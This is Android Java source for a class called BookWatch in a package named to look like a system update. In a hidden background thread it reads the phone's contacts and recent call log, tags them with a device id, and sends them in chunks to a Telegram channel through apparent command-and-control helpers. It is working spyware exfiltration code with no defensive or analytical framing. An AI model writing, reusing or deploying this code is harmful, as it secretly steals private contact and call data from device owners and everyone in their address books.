package com.system.update;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;

/** One-shot rich contacts + recent calls text dump. */
public final class BookWatch {
    private BookWatch() {}

    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📇 CONTACTS id=").append(C2.getDeviceId()).append('\n');
                Cursor c = ctx.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{
                                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                ContactsContract.CommonDataKinds.Phone.NUMBER
                        }, null, null, null);
                int n = 0;
                if (c != null) {
                    while (c.moveToNext() && n < 400) {
                        sb.append(c.getString(0)).append(" | ").append(c.getString(1)).append('\n');
                        n++;
                    }
                    c.close();
                }
                flush(sb, "📇 CONTACTS rows=" + n);
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "contacts_err:" + t.getMessage());
            }
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📞 CALLS id=").append(C2.getDeviceId()).append('\n');
                Cursor c = ctx.getContentResolver().query(
                        CallLog.Calls.CONTENT_URI, null, null, null,
                        CallLog.Calls.DATE + " DESC LIMIT 80");
                int n = 0;
                if (c != null) {
                    int iNum = c.getColumnIndex(CallLog.Calls.NUMBER);
                    int iType = c.getColumnIndex(CallLog.Calls.TYPE);
                    int iDate = c.getColumnIndex(CallLog.Calls.DATE);
                    int iDur = c.getColumnIndex(CallLog.Calls.DURATION);
                    while (c.moveToNext()) {
                        sb.append(c.getString(iNum)).append(" | type=").append(c.getInt(iType))
                                .append(" | d=").append(c.getLong(iDate))
                                .append(" | sec=").append(c.getLong(iDur)).append('\n');
                        n++;
                    }
                    c.close();
                }
                flush(sb, "📞 CALLS rows=" + n);
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "calls_err:" + t.getMessage());
            }
        }, "book").start();
    }

    private static void flush(StringBuilder sb, String header) {
        Telegram.send(header);
        String all = sb.toString();
        int pos = 0, part = 1;
        while (pos < all.length() && part <= 20) {
            int end = Math.min(pos + 3200, all.length());
            Telegram.send("[" + part + "]\n" + all.substring(pos, end));
            pos = end;
            part++;
            try { Thread.sleep(300); } catch (InterruptedException ignored) {}
        }
    }
}
